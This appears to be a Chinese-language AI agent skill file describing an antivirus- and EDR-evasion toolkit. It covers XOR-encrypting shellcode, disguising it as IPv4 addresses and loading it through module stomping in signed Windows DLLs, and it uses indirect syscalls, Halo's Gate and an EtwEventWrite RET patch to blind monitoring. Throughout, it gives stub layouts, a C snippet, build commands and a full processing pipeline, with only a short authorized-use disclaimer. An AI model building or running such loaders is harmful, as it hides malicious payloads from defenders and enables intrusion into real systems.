---
name: ai-av-evasion-optimized
description: 使用AI生成免杀Loader和处理Shellcode，结合Indirect Syscall、ETW补丁、Module Stomping、字符串加密、IPv4混淆等免杀技术绕过主流杀软和EDR检测
version: 5.2
date: 2026-08-10
status: Indirect Syscall + 单文件部署版
---

# AI免杀技术套件 — Indirect Syscall 版

## 功能描述

本Skill提供完整的免杀解决方案，包括Shellcode处理和Loader编写，综合运用Indirect Syscall、ETW补丁、Module Stomping、字符串加密、IPv4混淆等技术，绕过主流杀软和EDR检测。

**核心能力：**
- ✅ **Indirect Syscall**：跳转到 ntdll 中的 syscall;ret 指令，绕过用户态 Hook，调用栈显示合法 ntdll 返回地址
- ✅ **Halo's Gate**：处理被 Hook 的 Nt* 函数，从邻近存根推算 SSN
- ✅ **ETW 补丁**：通过 Indirect Syscall 修改 EtwEventWrite 内存保护，写入 RET 致盲 EDR 事件收集
- ✅ **.text Code Cave**：利用自身 .text 段 padding 存放 syscall stub，零额外可执行内存分配
- ✅ **Module Stomping**：加载合法微软签名 DLL，覆写其 `.text` 段作为执行内存
- ✅ **字符串编译期加密**：所有敏感字符串 XOR 0x5A 加密，运行时解密到栈上，二进制中无明文
- ✅ **内嵌 Payload 数据**：IPv4 数组和密钥编译进 Loader，无需 helper.dll，单文件部署
- ✅ **IPv4 编译期加密**：每个 IPv4 字符串用 XOR 0x5A 加密，二进制中不存在任何明文 IP 地址
- ✅ **HeapAlloc 解密缓冲**：使用堆分配而非 VirtualAlloc，行为与正常应用一致
- ✅ **直接函数指针调用**：无 CreateFiber（避免 PAGE_GUARD），无回调 API
- ✅ **零反沙箱/零系统指纹**：不查 CPU 核数、内存大小、VM 进程、时间加速
- ✅ **手动 IPv4 解析**：不用 sscanf，减少 CRT 导入特征
- ✅ **调用栈干净**：执行地址位于微软签名 DLL 内，栈回溯显示合法模块
- ✅ **SecureZeroMemory**：堆/栈明文即时擦除
- ✅ **Stub 自清理**：执行后恢复 .text padding 原始内容，销毁可执行痕迹
- ✅ **XOR 动态解密**：自定义密钥，加密后数据与随机数据不可区分
- ✅ **单文件部署**：无需 helper.dll，一个 exe 即可
- ✅ **无窗口静默**：-mwindows 编译为 GUI 程序

## 使用场景

当需要：
- 生成免杀的恶意代码载体（CTF比赛/授权渗透测试）
- 处理Shellcode以逃避检测
- 编写具有反检测能力的Loader
- 进行授权的安全测试和渗透评估

## 核心技术

### 1. Shellcode处理流程

#### 步骤1: Shellcode Patch
- **同义指令替换**：扫描已知等价指令模式进行替换（如 `test rax,rax` → `or rax,rax`），不改变指令长度和语义，仅改变字节特征
- **保守策略**：只替换同长度的等价指令，避免破坏相对跳转偏移
- **无匹配警告**：若未匹配到任何已知模式，输出提示信息

**脚本：scripts/shellcode-patch.py**

#### 步骤2: Shellcode加密
- **XOR加密**：使用自定义密钥对Shellcode进行异或加密
- **密钥长度自适应**：支持任意长度密钥（不可为空）
- **零特征**：加密后数据与随机数据不可区分

**脚本：scripts/shellcode-encrypt.py**

#### 步骤3: Shellcode混淆（IPv4方案）
- **编码伪装**：将Shellcode伪装成IPv4地址数组
- **无字节序问题**：直接按字节顺序转换
- **高熵隐藏**：数百个IP地址，静态扫描呈现为网络配置数据

**脚本：scripts/shellcode-obfuscate-ipv4.py**

#### 步骤4: 生成内嵌数据
- **编译期加密**：从 IPv4 数组提取数据，每个字符串 XOR 0x5A 加密后生成 C 头文件
- **密钥加密**：加密密钥同样 XOR 0x5A 加密
- **零明文**：生成的 payload_data.h 中不含任何明文敏感数据

**脚本：scripts/gen_embed_data.py**

### 2. Loader架构

#### 2.1 技术原理

```
本方案:  PatchETW() → 解密内嵌密钥 → HeapAlloc + IPv4反混淆 + XOR解密
         → LoadLibrary(签名DLL) → 解析PE找.text
         → Indirect Syscall写入 .text → FlushInstructionCache
         → SecureZeroMemory + HeapFree → CleanupSyscallStubs
         → 直接函数指针调用执行
         ↓ 隐匿: Indirect Syscall绕过用户态Hook, ETW致盲EDR
         ↓ 执行地址在签名DLL内, 调用栈显示合法ntdll返回地址
```

#### 2.2 执行流程

```
main()
  │
  ├─[1] PatchETW()                    ← Indirect Syscall 补丁 EtwEventWrite (RET)
  │
  ├─[2] DecryptStr(enc_key)           ← 解密内嵌密钥到栈上
  ├─[3] HeapAlloc(GetProcessHeap())   ← 堆分配 (非VirtualAlloc)
  ├─[4] deobfuscate_ipv4()            ← 从 enc_ipv4[] 解密+手动IPv4解析
  ├─[5] xor_decrypt()                 ← XOR解密还原Shellcode
  ├─[6] SecureZeroMemory(key)         ← 擦除栈上密钥明文
  │
  ├─[7] LoadLibraryA("msimg32.dll")   ← 加载合法签名DLL (加密字符串)
  │                                   (失败回退: dcomp.dll → dwmapi.dll)
  ├─[8] FindTextSection(hMod)         ← 解析PE找.text段
  │
  ├─[9] BuildSyscallStub(SSN)         ← 构建Indirect Syscall stub
  │     ├─ FindSyscallGadget()        ← 在ntdll .text中找 syscall;ret
  │     ├─ FindCodeCave()             ← 在自身.text padding中找空间
  │     ├─ ResolveSyscallNumber()     ← Halo's Gate解析SSN
  │     └─ WriteProcessMemory(stub)   ← 写入stub到Code Cave
  │
  ├─[10] Indirect Syscall写入 .text   ← NtWriteVirtualMemory (回退: WriteProcessMemory)
  ├─[11] FlushInstructionCache()      ← 刷新指令缓存
  │
  ├─[12] SecureZeroMemory(decBuf)     ← 擦除堆中明文
  ├─[13] HeapFree(decBuf)             ← 释放堆
  │
  ├─[14] CleanupSyscallStubs()        ← 恢复 .text padding 原始内容
  │
  └─[15] 函数指针调用(.text)           ← 直接调用执行 (无Fiber, 无回调)
```

#### 2.3 关键特性

| 维度 | 实现方式 |
|------|----------|
| 执行内存来源 | 签名DLL的 .text 段（Module Stomping） |
| 代码写入方式 | Indirect Syscall / WriteProcessMemory |
| Syscall Stub 存储 | .text Code Cave（零额外可执行内存） |
| 解密缓冲区 | HeapAlloc（堆分配） |
| 执行方式 | 直接函数指针调用（无 Fiber，无回调） |
| 字符串保护 | 编译期 XOR 加密，运行时栈上解密 |
| 系统信息查询 | 零查询 |
| IPv4 解析 | 手动解析（零 CRT 导入） |
| 执行地址栈回溯 | msimg32.dll!text（合法模块） |
| 导入 DLL | 仅 KERNEL32 + msvcrt |
| 内存清理 | SecureZeroMemory + HeapFree |
| 部署方式 | 单文件（无需 helper.dll） |

#### 2.4 DLL回退链

Loader在加载签名DLL时按顺序尝试，确保可用性：

```
msimg32.dll  →  dcomp.dll  →  dwmapi.dll
```

每个DLL加载后检查 `.text` 段大小是否足够容纳Shellcode，不足则释放后尝试下一个。

### 3. Indirect Syscall 详解

#### 3.1 原理

```
传统调用:  User Code → ntdll!NtWriteVirtualMemory (被Hook, 跳转到EDR)
           ↓ EDR 可拦截、记录、修改参数

Direct Syscall:  User Code → mov eax, SSN; syscall (自己执行)
                ↓ 绕过Hook, 但调用栈不经过ntdll, EDR可检测异常调用栈

Indirect Syscall:  User Code → stub(mov r10,rcx; mov eax,SSN; jmp [syscall;ret])
                   → ntdll!syscall;ret
                   ↓ 绕过Hook + 调用栈经过ntdll, EDR无法区分
```

#### 3.2 Syscall Stub 结构

```
┌──────────────────────────────────────────┐
│ mov r10, rcx        ; 4C 8B D1          │  ← Windows x64 调用约定
│ mov eax, SSN        ; B8 xx xx xx xx    │  ← 系统调用号
│ jmp [rip+0]         ; FF 25 00 00 00 00 │  ← 跳转到 syscall;ret
│ addr                ; xx xx xx xx xx xx │  ← ntdll 中 syscall;ret 地址
└──────────────────────────────────────────┘
共 22 字节, 存放在自身 .text 段的 Code Cave 中
```

#### 3.3 Halo's Gate

当目标 Nt* 函数被 EDR Hook 时，其 stub 头部不再是 `mov r10,rcx; mov eax,SSN`。

Halo's Gate 策略：向上/向下搜索邻近的未 Hook 存根，根据距离推算 SSN：

```
被Hook的函数: [jmp EDR]  ← 头部被替换
邻近未Hook:   [mov r10,rcx; mov eax, SSN_neighbor]
推算: SSN_target = SSN_neighbor ± distance
```

### 4. ETW 补丁详解

```
PatchETW():
  1. ResolveSyscallNumber("NtProtectVirtualMemory")  ← Halo's Gate 解析 SSN
  2. BuildSyscallStub(SSN)                            ← 构建 Indirect Syscall stub
  3. NtProtectVirtualMemory(EtwEventWrite, RWX)       ← 修改 EtwEventWrite 内存保护
  4. *(BYTE*)EtwEventWrite = 0xC3                     ← 写入 RET 指令
  5. NtProtectVirtualMemory(EtwEventWrite, old)       ← 恢复原始保护
```

效果：EDR 调用 `EtwEventWrite` 时立即返回，所有事件收集被致盲。

### 5. .text Code Cave 详解

```
PE .text 段布局:
┌────────────────────────────┐ ← VirtualAddress
│     实际代码 (.text)        │
│     ...                    │
├────────────────────────────┤ ← VirtualAddress + VirtualSize (代码结束)
│     Padding (0xCC/0x00)    │  ← Code Cave: 天然 RX 属性
│     ...                    │     无需额外分配可执行内存
├────────────────────────────┤ ← VirtualAddress + SizeOfRawData (段结束)
└────────────────────────────┘

Code Cave 大小 = SizeOfRawData - VirtualSize
Stub 写入前: WriteProcessMemory 修改保护并写入
Stub 使用后: CleanupSyscallStubs() 恢复原始 padding 内容
```

### 6. 字符串加密详解

```c
// 编译期: 每个 char XOR 0x5A
static const BYTE enc_msimg32[] = { 'm'^0x5A, 's'^0x5A, ... };

// 运行时: 解密到栈缓冲区
char name[16];
DecryptStr(enc_msimg32, name, sizeof(name));  // 栈上解密
// 使用 name ...
SecureZeroMemory(name, sizeof(name));          // 即时擦除
```

加密的字符串：msimg32.dll、dcomp.dll、dwmapi.dll、ntdll.dll、EtwEventWrite、NtWriteVirtualMemory、NtProtectVirtualMemory、密钥、每个 IPv4 地址。

## 编译

```bash
# 编译 Loader（单文件，零额外依赖）
gcc -mwindows -o loader.exe loader_v5.c -s
```

| 参数 | 说明 |
|------|------|
| `-mwindows` | GUI 程序，无控制台窗口 |
| `-s` | 去除符号表，减小体积 |

**零额外链接库**：不需要 `-lpsapi`，不依赖任何额外静态库。

## 使用指南

### 完整流水线

```bash
# === Phase 1-3: Shellcode处理 ===
cd scripts/
python shellcode-patch.py shellcode_raw.bin
python shellcode-encrypt.py shellcode_patched.bin "你的密钥"
python shellcode-obfuscate-ipv4.py shellcode_encrypted.bin

# === Phase 4: 生成内嵌数据头文件 ===
python gen_embed_data.py

# === Phase 5: 编译 Loader ===
gcc -mwindows -o loader.exe loader_v5.c -s

# === 部署 ===
# 单文件部署，只需 loader.exe
```

## 文件清单

### Shellcode处理脚本
- `scripts/shellcode-patch.py` — Shellcode字节特征修改工具
- `scripts/shellcode-encrypt.py` — Shellcode XOR加密工具
- `scripts/shellcode-obfuscate-ipv4.py` — IPv4地址混淆工具
- `scripts/gen_embed_data.py` — 内嵌数据生成脚本（生成 payload_data.h）

### Loader源码
- `scripts/loader_v5.c` — Indirect Syscall版Loader（主源码）
- `scripts/payload_data.h` — 加密数据头文件（由 gen_embed_data.py 生成）

### 示例文件
- `scripts/tcp_windows_amd64.bin` — 示例 Shellcode

## 注意事项

1. **合法性**：本工具仅用于授权的安全测试、CTF比赛和渗透评估
2. **密钥管理**：建议使用高强度随机密钥，密钥不可为空
3. **时效性**：免杀技术会随杀软更新失效，需定期更新策略
4. **测试验证**：每次使用前应在目标环境等效的测试环境中验证
5. **Module Stomping**：若 `msimg32.dll` 不可用，Loader自动回退到其他DLL
6. **Indirect Syscall**：syscall number 随 Windows 版本变化，Loader 运行时动态解析
7. **payload_data.h**：编译前必须先运行 `gen_embed_data.py` 生成此头文件

---

**最后更新：2026-08-10**
**当前版本：v5.2 — Indirect Syscall + 单文件部署版**
**测试环境：Windows 10/11 Pro x64**
